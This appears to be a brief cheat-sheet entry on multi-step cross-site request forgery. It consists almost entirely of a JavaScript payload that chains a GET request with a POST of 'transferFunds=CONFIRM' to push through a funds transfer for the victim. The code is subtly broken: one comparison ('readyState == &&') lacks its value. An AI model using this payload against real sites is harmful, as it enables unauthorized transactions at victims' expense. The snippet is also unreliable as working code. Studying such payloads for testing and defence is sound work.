# CSRF
## Multi Step CSRF
Payload 
><script>
>var req1=new XMLHttpRequest();
>req1.onreadystatechange = function()
>{
>&nbsp;&nbsp;&nbsp;&nbsp;if(req1.readyState == && req1.status ==200 )
>&nbsp;&nbsp;&nbsp;&nbsp;{
>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;req2 = new XMLHttpRequest();
>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;req2.open("POST",URL,false);
>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;req2.setRequestHeader("Content-type","application/x-www-form-urlencoded");
>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;req2.send("transferFunds=CONFIRM");
>&nbsp;&nbsp;&nbsp;&nbsp;}
>}
>req1.open("GET",URL,false);
>req1.send();
></script>
